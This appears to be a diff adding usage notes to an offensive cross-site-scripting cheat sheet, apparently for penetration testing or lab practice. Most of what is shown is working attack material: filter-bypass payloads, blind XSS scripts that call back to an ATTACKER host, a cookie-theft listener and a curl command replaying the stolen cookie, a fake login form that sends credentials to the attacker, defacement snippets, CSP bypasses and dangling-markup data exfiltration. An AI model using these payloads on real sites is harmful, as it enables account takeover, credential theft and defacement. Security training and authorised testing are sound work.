@@ -20,6 +20,7 @@
 <script>print()</script>                    <!-- print dialog — bypass alert blocks -->
 <plaintext>                                  <!-- stops HTML render — visual confirm -->
 ```
+> Start with `alert(window.origin)` to confirm which page is running your script. Use `print()` if the app blocks `alert()`. Use `<plaintext>` when you just need a visual sign that HTML parsing stopped.
 
 When `<script>` is filtered (innerHTML, wp_kses):
 ```html
@@ -29,6 +30,7 @@ When `<script>` is filtered (innerHTML, wp_kses):
 <body onload=alert(1)>
 <details open ontoggle=alert(1)>
 ```
+> These bypass filters that strip `<script>` tags. `<img onerror>` is the most reliable — a broken image source always triggers the error event. Mix and match based on what the target allows.
 
 ---
 
@@ -68,6 +70,7 @@ git clone https://github.com/s0md3v/XSStrike.git
 cd XSStrike && pip install -r requirements.txt
 python xsstrike.py -u "http://TARGET/page.php?param=test"
 ```
+> Clones XSStrike, installs its Python dependencies, then scans a URL. Replace `param=test` with the parameter you want to test. XSStrike generates context-aware payloads and reports which ones work.
 
 Payload lists on Kali:
 - `~/SecLists/Fuzzing/XSS/robot-friendly/`  ← ffuf/burp
@@ -85,6 +88,7 @@ When you can't see where input lands (admin panel, support ticket), use unique c
 <!-- in field "email" -->
 <script src=http://ATTACKER/email></script>
 ```
+> Each field gets a unique URL path. When the admin views the submission, the incoming request path tells you which field triggered. Replace `ATTACKER` with your tun0 IP and listener port.
 
 Whichever path fires identifies the vulnerable field. Try with breakouts:
 ```html
@@ -92,6 +96,7 @@ Whichever path fires identifies the vulnerable field. Try with breakouts:
 '><script src=http://ATTACKER/field_sq></script>
 http://x"><script src=http://ATTACKER/url></script>   <!-- href context -->
 ```
+> Try all three breakout prefixes. Double-quote (`">`), single-quote (`'>`), and the `http://x"` form for href attributes that require a URL prefix before they accept a quote. Use whichever matches the HTML context.
 
 ---
 
@@ -123,11 +128,13 @@ mkdir /tmp/listener && cd /tmp/listener
 # write index.php + script.js
 php -S 0.0.0.0:8080 &
 ```
+> Creates a working directory, then starts PHP's built-in web server on all interfaces on port 8080. The `&` puts it in the background. Port 80 requires root; use 8080 or higher to avoid that.
 
 Use stolen cookie:
 ```bash
 curl -sk "http://TARGET/admin/" -H "Cookie: name=value"
 ```
+> Replays the stolen cookie in a curl request. Replace `name=value` with the cookie name and value from `cookies.txt`. This logs you in as the victim without a password.
 
 ---
 
@@ -141,6 +148,7 @@ document.write('<h3>Please login</h3><form action=http://ATTACKER:8080>'
 document.getElementById('urlform').remove();
 </script><!--
 ```
+> Breaks out of the attribute with `'>`, writes a fake login form pointing to your server, and removes the real form. The trailing `<!--` comments out leftover original HTML so broken tags don't give away the attack.
 
 `index.php` (credential catcher with redirect):
 ```php
@@ -165,6 +173,7 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 <script>document.title = "Hacked"</script>
 <script>document.getElementsByTagName('body')[0].innerHTML = "..."</script>
 ```
+> Four building blocks for defacement. Background color and image, page title, and full body replacement. Inject via stored XSS to affect every visitor until the payload is removed.
 
 ---
 
@@ -226,6 +235,7 @@ When `Content-Security-Policy` blocks inline scripts, you need a permitted sourc
 curl -sI http://TARGET/ | grep -i content-security
 # Look for: script-src, default-src, base-uri, object-src
 ```
+> Fetches only the response headers (`-I`) and filters for the Content Security Policy (CSP) line. Look for weak directives like `unsafe-inline`, `unsafe-eval`, or wildcard sources.
 
 ### CSP Evaluator
 - Paste the policy at https://csp-evaluator.withgoogle.com/
@@ -253,6 +263,7 @@ script-src ajax.googleapis.com → load Angular and use template injection
 script-src cdnjs.cloudflare.com → many libs allow user-controlled inputs that lead to RCE
 script-src *.google.com → use Google Caja or AppEngine for hosted JS
 ```
+> When a Content Security Policy (CSP) whitelists a CDN that hosts user-controllable content, load a payload from that CDN. Angular template injection and JSONP callbacks are common abuse paths.
 
 ### Dangling markup (no JS execution but data exfil)
 ```html
@@ -260,6 +271,7 @@ script-src *.google.com → use Google Caja or AppEngine for hosted JS
 <img src='http://attacker/?data=
 <!-- Page content from this point onward is sent to attacker as a URL -->
 ```
+> An unclosed `src` attribute causes the browser to treat all following page text as part of the URL. This leaks page content to your server without executing any JavaScript — useful when CSP is strict.
 
 ---
 
